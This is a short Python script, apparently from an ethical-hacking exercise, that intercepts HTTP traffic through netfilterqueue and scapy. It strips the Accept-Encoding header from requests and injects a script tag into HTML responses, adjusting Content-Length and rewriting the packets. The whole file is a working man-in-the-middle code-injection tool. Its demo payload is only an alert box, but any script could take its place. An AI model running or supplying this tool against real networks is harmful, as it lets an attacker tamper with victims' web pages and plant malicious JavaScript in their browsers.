import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    # Set the new payload and recalculate packet attributes
    packet[scapy.Raw].load = load  # Already in bytes format

    # Recalculate the IP and TCP checksum after modifying the payload
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # Convert raw packet to Scapy packet
    
    if scapy_packet.haslayer(scapy.TCP):  # Ensure it has a TCP layer
        if scapy_packet.haslayer(scapy.Raw):  # Ensure it has a Raw payload layer
            if hasattr(scapy_packet[scapy.Raw], 'load'):  # Ensure Raw layer has 'load'
                load = scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                # Handle HTTP request (destination port 80)
                if scapy_packet[scapy.TCP].dport == 80:
                    print("[+] HTTP request detected")
                    # Modify the request by removing the Accept-Encoding header
                    load = re.sub(r"(?i)Accept-Encoding:.*?\r\n", "", load)

                # Handle HTTP response (source port 80)
                elif scapy_packet[scapy.TCP].sport == 80:
                    # load = re.sub(r"(?i)Cache-Control:.*?\r\n", "", load)
                    # load = re.sub(r"(?i)Expires:.*?\r\n", "", load)
                    # load = re.sub(r"(?i)Strict-Transport-Security:.*?\r\n", "", load)
                    print("[+] HTTP response detected")
                    print(f"[-] the original load: {load}")
                    injection_code = '<script>alert("hi");</script>'

                    # Ensure it's HTML content and inject script before </html>, </body>, or </head> tags
                    if "<html>" in load.lower():
                        print("[====] Injecting the evil code")

                        # Inject the script just before the </body> tag
                        if "</body>" in load.lower():
                            load = load.replace("</body>", injection_code + "</body>")
                        elif "</html>" in load.lower():  # If no </body> tag is found, fallback to injecting before </html>
                            load = load.replace("</html>", injection_code + "</html>")
                        elif "</head>" in load.lower():  # If no </body> or </html> tag is found, inject before </head>
                            load = load.replace("</head>", injection_code + "</head>")
                        else:
                            # If no common tag is found, inject at the end of the payload
                            load += injection_code
                        # Adjust the Content-Length header based on the injected code
                        if "Content-Length:" in load:
                            content_length_search = re.search(r"(Content-Length:\s)(\d+)", load)
                            if content_length_search:
                                original_length = int(content_length_search.group(2))  # Get the original length
                                new_content_length = original_length + len(injection_code)  # Add the length of the injected code
                                load = load.replace(content_length_search.group(0), f"Content-Length: {new_content_length}")  # Update header
                        print(f"[-]modified load>>>> {load}")
                        # Optionally, remove cache headers (if needed)



                # If the load was modified, update the original packet
                if load != scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore'):
                    new_packet = set_load(scapy_packet, load.encode('utf-8'))
                    packet.set_payload(bytes(new_packet))
    
    # Accept the packet (modified or not)
    packet.accept()

# Bind to the netfilter queue and start processing packets
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

